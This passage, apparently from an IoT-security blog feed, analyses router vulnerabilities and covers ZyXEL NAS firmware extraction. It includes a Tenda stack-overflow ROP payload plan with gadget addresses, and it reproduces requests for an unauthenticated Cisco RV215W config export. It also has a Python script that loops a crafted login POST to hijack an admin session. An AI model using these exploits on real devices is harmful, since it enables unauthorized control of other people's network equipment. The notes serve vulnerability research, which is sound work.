<li>查看分支跳转时：右键group nodes折叠块</li>
<li>uri与相应的函数</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 并非只加/，还需其他路径</span></span><br><span class="line">int my_caller3()</span><br><span class="line">&#123;</span><br><span class="line">  sub_10120(<span class="string">"TendaGetLongString"</span>, aspTendaGetLongString);</span><br><span class="line">  sub_10120(<span class="string">"aspTendaGetStatus"</span>, aspTendaGetStatus);</span><br><span class="line">  sub_171EC(<span class="string">"setMacFilterCfg"</span>, my_caller2_formSetMacFilterCfg);</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 发现文件及其内容</span></span><br><span class="line">webroot_ro/goform/setMacFilterCfg.txt</span><br><span class="line">&#123;<span class="string">"errCode"</span>:<span class="string">"0"</span>&#125;<span class="comment"># 内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单测试后，形式：IP/goform/setMacFilterCfg</span></span><br></pre></td></tr></table></figure>
<ul>
<li>溢出时的缓冲区不一定是在本函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 缓冲区来自参数2</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">my_vulnee</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *deviceList, <span class="keyword">char</span> *buff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(buff + <span class="number">32</span>, deviceList);              <span class="comment">// overflow!</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buff, mac);</span><br><span class="line"><span class="comment">// 最终来自调用者</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">my_vulner</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *macFilterType, <span class="keyword">const</span> <span class="keyword">char</span> *deviceList, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buff[<span class="number">176</span>]; <span class="comment">// [sp+14Ch] [bp-B0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="number">0xA0</span>u);</span><br><span class="line">  my_vulnee(deviceList, buff);                  <span class="comment">// from a2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>CPSR寄存器的T位：右数第6</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里记得检查下CPSR寄存器的T位，因为栈上内容弹出到PC寄存器时，其最低有效位（LSB）将被写入CPSR寄存器的T位，而PC本身的LSB被设置为0。如果T位值为1，需要在地址上加一还原</span></span><br><span class="line">pc原来的lsb为0，则T为0，此时不变</span><br><span class="line">原来的lsb为1，则t为1，相当于-1</span><br></pre></td></tr></table></figure>
<ul>
<li>构造exp<ul>
<li>libc基址：0xf6592000（vmmap</li>
<li>system函数地址：0005a270（readelf + grep</li>
<li>0x00040cb8 : mov r0, sp ; blx r3、（ROPgadget</li>
<li>0x00018298 : pop {r3, pc}</li>
<li>注意：libc基址、IP地址、少了的反斜杠</li>
</ul>
</li>
<li>最终payload格式为：[offset, gadget1, system_addr, gadget2, cmd] ，流程如下：<ul>
<li>溢出处函数返回跳转到第一个gadget1（pop {r3, pc}）；</li>
<li>栈顶第一个元素（system_addr）弹出到R3寄存器，第二个元素(gadget2：mov r0, sp ; blx r3})弹出到PC，使程序流执行到gadget2；</li>
<li>此时的栈顶内容（cmd）放入R0寄存器，并使程序跳转到R3寄存器指向的地址去执行。</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://www.anquanke.com/post/id/204403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204403</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>Cisco设备多个漏洞的分析</title>
    <url>/2021/06/09/iot/Cisco%E8%AE%BE%E5%A4%87%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="Cisco设备多个漏洞的分析"><a href="#Cisco设备多个漏洞的分析" class="headerlink" title="Cisco设备多个漏洞的分析"></a>Cisco设备多个漏洞的分析</h1><h2 id="CVE-2020-3150：信息泄漏"><a href="#CVE-2020-3150：信息泄漏" class="headerlink" title="CVE-2020-3150：信息泄漏"></a>CVE-2020-3150：信息泄漏</h2><ul>
<li>未经身份验证的配置导出</li>
<li>前提<ul>
<li>管理员用户需要打开backup.asp页面（在最近一次重启后</li>
<li>一旦访问此页面，则httpd二进制文件会设置一个flag，允许产生startup.cfg文件 (设置的flag保存在/tmp/config.txt).</li>
<li>访问startup.cfg文件</li>
</ul>
</li>
<li>原因：对URL的访问控制不当</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/startup.cfg</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">200</span> Ok</span><br><span class="line"><span class="attribute">Server</span>: httpd</span><br><span class="line"><span class="attribute">Date</span>: Fri, 01 Jan 2010 00:01:46 GMT</span><br><span class="line"><span class="attribute">Content-Disposition</span>: attachment; filename=RV215W_startup.cfg</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line">;RV215W Configuration File - Version: 1.1.0.5</span><br><span class="line">;MAC address: 10:BD:18:AC:57:3A</span><br><span class="line">;Serial Number: CCQ231407B9</span><br><span class="line">;The checksum: 8A41D8E444067386</span><br><span class="line">--snip--</span><br></pre></td></tr></table></figure>
<ul>
<li>其他文件也会受到影响，但取决于安装程序，例如mirror.cfg或backup.cfg</li>
</ul>
<h2 id="CVE-2020-3145：栈溢出-RCE"><a href="#CVE-2020-3145：栈溢出-RCE" class="headerlink" title="CVE-2020-3145：栈溢出/RCE"></a>CVE-2020-3145：栈溢出/RCE</h2><ul>
<li>需要通过认证（注意如下有session_id</li>
<li>多处strcpy栈溢出</li>
<li>POST /apply.cgi;session_id=b37f0e917e54a1af0e1d7a0027d9de5d HTTP/1.1、post数据的wizard_pppoe_pname字段</li>
</ul>
<h2 id="CVE-2020-3146"><a href="#CVE-2020-3146" class="headerlink" title="CVE-2020-3146"></a>CVE-2020-3146</h2><ul>
<li>类似3145</li>
</ul>
<h2 id="CVE-2020-3144：认证绕过"><a href="#CVE-2020-3144：认证绕过" class="headerlink" title="CVE-2020-3144：认证绕过"></a>CVE-2020-3144：认证绕过</h2><p>//here，未完待续</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login.cgi</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.1</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1812</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line">submit_button=login&amp;submit_type=continue&amp;gui_action=gozilla_cgi</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"submit_button"</span>:<span class="string">"login"</span>,</span><br><span class="line">    <span class="string">"submit_type"</span>:<span class="string">"continue"</span>,</span><br><span class="line">    <span class="string">"gui_action"</span>:<span class="string">"gozila_cgi"</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.post(</span><br><span class="line">            <span class="string">"https://192.168.1.1/login.cgi"</span>,</span><br><span class="line">            data=payload,</span><br><span class="line">            verify=<span class="keyword">False</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Login Page"</span> <span class="keyword">in</span> resp.content:</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sessionid = re.findall(<span class="string">r"session_id=([^\"]+)"</span>, resp.content)[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">"[+] Successfully hijacked admin session. Session id is</span></span><br><span class="line"><span class="string">            &#123;&#125;"</span>.format(sessionid))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/" target="_blank" rel="noopener">https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
        <tag>认证绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>TP-Link Archer A7漏洞分析及利用</title>
    <url>/2021/06/02/iot/TP-Link%20Archer%20A7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="TP-Link-Archer-A7漏洞分析及利用"><a href="#TP-Link-Archer-A7漏洞分析及利用" class="headerlink" title="TP-Link Archer A7漏洞分析及利用"></a>TP-Link Archer A7漏洞分析及利用</h1><ul>
<li><p>漏洞对比</p>
<ul>
<li><strong>Patched version :</strong> <a href="https://static.tp-link.com/2020/202003/20200313/Archer A7(US" target="_blank" rel="noopener">Archer A7(US)_V5_200220</a>_V5_200220.zip)</li>
<li><strong>Previous version :</strong> <a href="https://static.tp-link.com/2019/201908/20190816/Archer C7(US" target="_blank" rel="noopener">Archer C7(US)_V5_190726</a>_V5_190726.zip)</li>
<li>Note that Archer C7 and A7 models share most of the binaries, so technically it does not matter if we are looking at the C7 or A7 firmware image.</li>
</ul>
</li>
<li><p>定位（通过字符串</p>
<ul>
<li>漏洞描述：<strong>slave_mac</strong></li>
<li>字符串slave_mac或slave mac的引用（模糊一点好）</li>
<li>结合bindiff，排除相似度为1的</li>
</ul>
</li>
<li><p>定位（通过函数</p>
<ul>
<li>漏洞描述：<strong>system call</strong></li>
<li>system函数的引用（本二进制的，而非lib库的</li>
<li>结合bindiff，排除相似度为1的</li>
<li>要用户可控参数的，排除参数写死的</li>
</ul>
</li>
<li><p>调试</p>
<ul>
<li>./gdbserver.mipsbe 0.0.0.0:8908 /usr/bin/tdpServer</li>
<li>gdb-multiarch：set arch mips、set endian big</li>
</ul>
</li>
<li><p>tdpServer服务，运行在UDP的20002端口，可直接socket编程来测试</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">IP=<span class="string">"192.168.0.254"</span></span><br><span class="line">PORT=<span class="number">20002</span></span><br><span class="line">addr = (IP,PORT)</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">s.sendto(<span class="string">b'0x01'</span>*<span class="number">16</span>,(IP,PORT))</span><br></pre></td></tr></table></figure>
</li>
<li><p>杂乱</p>
<ul>
<li>放弃bindiffhelper，其要用到bindiff6，其mac下不行，binexport插件+bindiff5足矣</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考</p>
<ul>
<li><p>Analysis &amp; Exploitation of a Recent TP-Link Archer A7 Vulnerability，<a href="https://starlabs.sg/blog/2020/10/analysis-exploitation-of-a-recent-tp-link-archer-a7-vulnerability/" target="_blank" rel="noopener">https://starlabs.sg/blog/2020/10/analysis-exploitation-of-a-recent-tp-link-archer-a7-vulnerability/</a></p>
</li>
<li><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-334/" target="_blank" rel="noopener">https://www.zerodayinitiative.com/advisories/ZDI-20-334/</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>ZyXEL-NSA310固件分析</title>
    <url>/2021/05/23/iot/ZyXEL-NSA310%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="ZyXEL-NSA310固件分析"><a href="#ZyXEL-NSA310固件分析" class="headerlink" title="ZyXEL-NSA310固件分析"></a>ZyXEL-NSA310固件分析</h1><h2 id="00-pre"><a href="#00-pre" class="headerlink" title="00-pre"></a>00-pre</h2><ul>
<li>固件：<a href="https://drivers.softpedia.com/get/FIRMWARE/Zyxel/ZyXEL-NSA310-Media-Server-Firmware-470AFK1C0.shtml" target="_blank" rel="noopener">https://drivers.softpedia.com/get/FIRMWARE/Zyxel/ZyXEL-NSA310-Media-Server-Firmware-470AFK1C0.shtml</a></li>
<li>binwalk</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># binwalk也会产生误报，但有两个地方大致正确：0x13D、0x56EE45（怎么判断的？推测/验证中可见，这是两个文件的开头</span></span><br><span class="line"><span class="comment"># 0x3435貌似是uimage的一部分（怎么判断？推测/验证中可见</span></span><br><span class="line"><span class="comment"># uImage从0x13D开始，那么前面可能是相关头信息（一般固件都是从0开始</span></span><br><span class="line"></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ binwalk 470AFK1C0.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">317           0x13D           uImage header, header size: 64 bytes, header CRC: 0xB430E9EB, created: 2014-04-15 01:34:59, image size: 5696712 bytes, Data Address: 0x8000, Entry Point: 0x8000, data CRC: 0xD0375CFE, OS: Linux, CPU: ARM, image <span class="built_in">type</span>: OS Kernel Image, compression <span class="built_in">type</span>: none, image name: <span class="string">"Linux-2.6.31.8"</span></span><br><span class="line">13365         0x3435          gzip compressed data, maximum compression, from Unix, last modified: 2014-04-15 01:34:58</span><br><span class="line">5697093       0x56EE45        gzip compressed data, maximum compression, from Unix, last modified: 2014-04-15 01:35:13</span><br><span class="line">8105054       0x7BAC5E        MySQL ISAM index file Version 8</span><br><span class="line">47240237      0x2D0D42D       Executable script, shebang: <span class="string">"/bin/sh"</span></span><br><span class="line">47240446      0x2D0D4FE       Unix path: /zyxel/mnt/info/revision`<span class="string">"</span></span><br><span class="line"><span class="string">47240830      0x2D0D67E       Unix path: /usr/local/zy-pkgs/tmp list | egrep "</span>(pkgName:)|(status:)<span class="string">" &gt; <span class="variable">$&#123;INSTALLED_PKGS&#125;</span></span></span><br><span class="line"><span class="string">47242007      0x2D0DB17       Unix path: /usr/local/zy-pkgs/tmp -recursive remove <span class="variable">$&#123;pkgsInstalled&#125;</span></span></span><br><span class="line"><span class="string">47242203      0x2D0DBDB       Unix path: /i-data/md0/admin/zy-pkgs/ZYPKGS</span></span><br><span class="line"><span class="string">47242240      0x2D0DC00       Unix path: /i-data/md0/admin/zy-pkgs/*.zpkg</span></span><br><span class="line"><span class="string">47242350      0x2D0DC6E       Unix path: /usr/local/zy-pkgs/tmp list | egrep "</span>(pkgName:)|(status:)<span class="string">"</span></span><br><span class="line"><span class="string">47242548      0x2D0DD34       Executable script, shebang: "</span>/bin/sh<span class="string">"</span></span><br><span class="line"><span class="string">47242612      0x2D0DD74       Unix path: /etc/zyxel/storage/webdisk.db ]; then</span></span><br><span class="line"><span class="string">47242665      0x2D0DDA9       Unix path: /etc/zyxel/storage/webdisk.db 'update webdisk set upload_bandwidth=250'"</span> &gt; /dev/console</span><br><span class="line">47242762      0x2D0DE0A       Unix path: /etc/zyxel/storage/webdisk.db <span class="string">'update webdisk set upload_bandwidth=250'</span></span><br><span class="line">47242843      0x2D0DE5B       Unix path: /etc/zyxel/storage/webdisk.db .d &gt; /dev/console 2&gt;&amp;1</span><br><span class="line">47243053      0x2D0DF2D       Unix path: /zyxel/mnt/info/revision`<span class="string">"</span></span><br><span class="line"><span class="string">47243132      0x2D0DF7C       Unix path: /etc/zyxel/conf/startup-config.conf"</span></span><br></pre></td></tr></table></figure>
<h2 id="01-发现规律"><a href="#01-发现规律" class="headerlink" title="01-发现规律"></a>01-发现规律</h2><ul>
<li>hexdump发现规律：1蓝色 + 1蓝色 +  4红色 + data绿色（data长度由4红色指定，小端</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2022-03-04-64954.jpg" alt="image-20210121152025381"></p>
<ul>
<li>不考虑4字节data，整理成表，进一步观察（未识别ascii的便0x形式，并且也小端表示）</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2022-03-04-064953.jpg" alt="image-20210121152941918"></p>
<h2 id="02-推测-验证"><a href="#02-推测-验证" class="headerlink" title="02-推测/验证"></a>02-推测/验证</h2><ul>
<li>0002、0102、0402处，其值类似hash值</li>
<li>xx10、xxA0以及ffff共9处，其值类似文件中地址/偏移</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0010处，其值为0x10d，这个规律从0x30开始的，故加上之前的0x30，0x10d+0x30=0x13d，正是binwalk中uimage的开始，确实是文件中偏移，故一共有9个文件偏移</span></span><br><span class="line">317           0x13D           uImage header, header size: 64 bytes,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9个文件偏移中，除前1后2，中间6个，两两一组，共3组，都是+1的关系，推测：前者是旧的结束、后者是新的开始，正好差1</span></span><br><span class="line"><span class="comment"># 0010处的0x10d+0x30=0x13d是uimage的开始，0110处的56ee14是uimage的结束，而56ee15新的开始</span></span><br><span class="line"><span class="comment"># 所以：9个文件偏移中，前8个组成了4个文件（第9同第8一致，且是ffff，应该是一个结束的标记，无他用）</span></span><br></pre></td></tr></table></figure>
<ul>
<li>加上最开始的0x30偏移，共组成10部分：头部信息、上面的规律字典、4文件的开始及结束</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2022-03-04-064957.jpg" alt="image-20210121160408202"></p>
<ul>
<li>验证hash与文件偏移的对应</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如上，0x13d-0x56ee44 是第一个文件（也就解释了binwalk中“0x3435貌似是uimage的一部分”的说法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dd提取第一个文件</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ dd <span class="keyword">if</span>=470AFK1C0.bin skip=317 count=5696776 bs=1 of=uimage.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取md5的hash值，正好是0002处的hash</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ md5sum uimage.bin </span><br><span class="line">41eacd652ed51989d9f413956293583d  uimage.bin</span><br></pre></td></tr></table></figure>
<ul>
<li>共4个文件，而hash值只有3个，为什么数量没对应上？</li>
</ul>
<h2 id="03-文件1-uImage"><a href="#03-文件1-uImage" class="headerlink" title="03-文件1-uImage"></a>03-文件1-uImage</h2><h3 id="1-获取uImage"><a href="#1-获取uImage" class="headerlink" title="1-获取uImage"></a>1-获取uImage</h3><ul>
<li><p>dd提取：dd if=470AFK1C0.bin skip=317 count=5696776 bs=1 of=uimage.bin</p>
</li>
<li><p>uImage文件是一个启动镜像（boot image），其内包含内核及RAM（Linux kernel and a RAM disk）</p>
</li>
</ul>
<h3 id="2-获取zImage"><a href="#2-获取zImage" class="headerlink" title="2-获取zImage"></a>2-获取zImage</h3><ul>
<li>有现成工具extract_uImage.sh，可用于提取（随便Google即可<a href="https://gist.github.com/adamvr/1079762" target="_blank" rel="noopener">https://gist.github.com/adamvr/1079762</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ chmod +x extract_uimage.sh </span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ ./extract_uimage.sh uimage.bin </span><br><span class="line">Checking <span class="keyword">for</span> uImage magic word...</span><br><span class="line">4 bytes copied, 0.00199709 s, 2.0 kB/s</span><br><span class="line">uImage recognized.</span><br><span class="line"></span><br><span class="line">Extracting data...</span><br><span class="line">5696712 bytes (5.7 MB, 5.4 MiB) copied, 0.140504 s, 40.5 MB/s</span><br><span class="line"></span><br><span class="line">Checking <span class="keyword">for</span> ARM mach-type...</span><br><span class="line">3 bytes copied, 0.000224081 s, 13.4 kB/s</span><br><span class="line"></span><br><span class="line">Checking <span class="keyword">for</span> zImage...</span><br><span class="line">4 bytes copied, 0.000866957 s, 4.6 kB/s</span><br><span class="line">4 bytes copied, 0.00021174 s, 18.9 kB/s</span><br><span class="line">4 bytes copied, 0.000206447 s, 19.4 kB/s</span><br><span class="line">zImage recognized with start 0x00000000, end 0x0056ECC8 and size 5696712.</span><br><span class="line">&gt;&gt;&gt; uimage.bin extracted to zImage</span><br><span class="line"><span class="comment"># 得到zImage</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ ls</span><br><span class="line">470AFK1C0.bin  extract_uimage.sh  uimage.bin  zImage</span><br></pre></td></tr></table></figure>
<ul>
<li>zImage用来启动Linux，其包含了Linux内核和RAM disk，RAM就是设备上根目录</li>
</ul>
<h3 id="3-自动提取"><a href="#3-自动提取" class="headerlink" title="3-自动提取"></a>3-自动提取</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># binwalk -Me可直接解开</span></span><br><span class="line">_zImage.extracted/_32B8.extracted/_1C1E0.extracted/cpio-root$ ls</span><br><span class="line">bin  dev  e-data  etc  home  i-data  init  lib  linuxrc  mnt  proc  ram_bin  root  sbin  sys  tmp  usr  var  zyxel</span><br></pre></td></tr></table></figure>
<h3 id="4-手动提取"><a href="#4-手动提取" class="headerlink" title="4-手动提取"></a>4-手动提取</h3><ul>
<li>dd + gunzip得到more.bin.gz </li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只有一个gzip压缩的数据包</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ binwalk zImage </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">12984         0x32B8          gzip compressed data, maximum compression, from Unix, last modified: 2014-04-15 01:34:58</span><br><span class="line"><span class="comment"># dd提取，gunzip解压</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ dd <span class="keyword">if</span>=zImage of=more.bin.gz skip=12984 bs=1</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ gunzip more.bin.gz </span><br><span class="line">gzip: more.bin.gz: decompression OK, trailing garbage ignored</span><br></pre></td></tr></table></figure>
<ul>
<li>dd+gunzip得到initrd.bin</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 还有一个gzip包，怀疑是ram disk</span></span><br><span class="line"><span class="comment"># gzip后还有许多乱七八糟的，怀疑是binwalk误报，其后面那些很可能就是其一部分</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ binwalk more.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">79173         0x13545         Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 13588</span><br><span class="line">115168        0x1C1E0         gzip compressed data, maximum compression, from Unix, last modified: 2014-04-15 01:34:23</span><br><span class="line">2938524       0x2CD69C        Linux kernel version <span class="string">"2.6.31.8 (root@nasbuilder-desktop) (gcc version 4.3.2 (sdk3.3-ct-ng-1.4.1) ) #5 Tue Apr 15 09:34:41 CST 2014"</span></span><br><span class="line">3158684       0x30329C        CRC32 polynomial table, little endian</span><br><span class="line">3663117       0x37E50D        Unix path: /release_build/NSA310/470AFK1b1/linux-2.6.31.8/arch/arm/include/asm/dma-mapping.h</span><br><span class="line">...</span><br><span class="line"><span class="comment"># dd提取并gunzip解压</span></span><br><span class="line"><span class="comment"># 注意：binwalk可能有误报，115168处是gzip开始，那么其后面可能都是其一部分，故未指定count</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ dd <span class="keyword">if</span>=more.bin of=initrd.bin.gz bs=1 skip=115168</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ gunzip initrd.bin.gz </span><br><span class="line">gzip: initrd.bin.gz: decompression OK, trailing garbage ignored</span><br></pre></td></tr></table></figure>
<ul>
<li>cpio挂载</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  cpio类型，并且file name: "/bin/tail"（出现了所有Linux文件系统该有的文件）</span></span><br><span class="line"><span class="comment"># 很久之前，unix时代，RAM disk是CPIO格式的一种，因此这就是ram disk</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ binwalk initrd.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             ASCII cpio archive (SVR4 with no CRC), file name: <span class="string">"/init"</span>, file name length: <span class="string">"0x00000006"</span>, file size: <span class="string">"0x00000B4C"</span></span><br><span class="line">116           0x74            Executable script, shebang: <span class="string">"/bin/sh"</span></span><br><span class="line">2179          0x883           Unix path: /proc/sys/net/ipv4/ip_local_port_range</span><br><span class="line">2233          0x8B9           Unix path: /proc/sys/vm/min_free_kbytes</span><br><span class="line">2276          0x8E4           Unix path: /proc/sys/vm/vfs_cache_pressure</span><br><span class="line">2320          0x910           Unix path: /proc/sys/vm/dirty_background_ratio</span><br><span class="line">2368          0x940           Unix path: /proc/sys/vm/dirty_ratio</span><br><span class="line">3008          0xBC0           ASCII cpio archive (SVR4 with no CRC), file name: <span class="string">"/bin"</span>, file name length: <span class="string">"0x00000005"</span>, file size: <span class="string">"0x00000000"</span></span><br><span class="line">3124          0xC34           ASCII cpio archive (SVR4 with no CRC), file name: <span class="string">"/bin/tail"</span>, file name length: <span class="string">"0x0000000A"</span>, file size: <span class="string">"0x00000008"</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># cpio挂载ram disk，ls发现确实是Linux系统（同binwalk -Me一致）</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ mkdir ram_disk &amp;&amp; <span class="built_in">cd</span> ram_disk/</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15/ram_disk$ sudo cpio -i --no-absolute-filenames &lt;../initrd.bin </span><br><span class="line">cpio: Removing leading `/<span class="string">' from member names</span></span><br><span class="line"><span class="string">cpio: init not created: newer or same age version exists</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">13448 blocks</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp/15/ram_disk$ ls</span></span><br><span class="line"><span class="string">bin  dev  e-data  etc  home  i-data  init  lib  linuxrc  mnt  proc  ram_bin  root  sbin  sys  tmp  usr  var  zyxel</span></span><br></pre></td></tr></table></figure>
<ul>
<li>完整流程<ul>
<li>firmware.bin</li>
<li>（dd）uImage.bin：启动镜像（boot image），其内包含内核及RAM（Linux kernel and a RAM disk）</li>
<li>（extract_uimage.sh脚本）zImage：用来启动Linux，其包含了Linux内核和RAM disk，RAM就是设备上根目录</li>
<li>（dd+gunzip）more.bin</li>
<li>（dd+gunzip）initrd.bin：cpio格式的ram disk</li>
<li>cpio挂载</li>
</ul>
</li>
</ul>
<h2 id="04-文件2-filesystem"><a href="#04-文件2-filesystem" class="headerlink" title="04-文件2-filesystem"></a>04-文件2-filesystem</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dd提取（见binwalk及文件分布图</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ dd <span class="keyword">if</span>=470AFK1C0.bin of=2.bin skip=5697093 bs=1 count=41543144</span><br><span class="line">41543144+0 records <span class="keyword">in</span></span><br><span class="line">41543144+0 records out</span><br><span class="line">41543144 bytes (42 MB, 40 MiB) copied, 99.2337 s, 419 kB/s</span><br><span class="line"></span><br><span class="line"><span class="comment"># gzip包，故改后缀后解压</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ file 2.bin </span><br><span class="line">2.bin: gzip compressed data, last modified: Tue Apr 15 01:35:13 2014, max compression, from Unix</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ mv 2.bin 2.bin.gz</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ gunzip 2.bin.gz </span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux 的ext2 文件系统</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/15$ file 2.bin </span><br><span class="line">2.bin: Linux rev 1.0 ext2 filesystem data, UUID=97a57b28-89af-4bd8-9a97-aa3a3afac867</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建目录并挂载</span></span><br><span 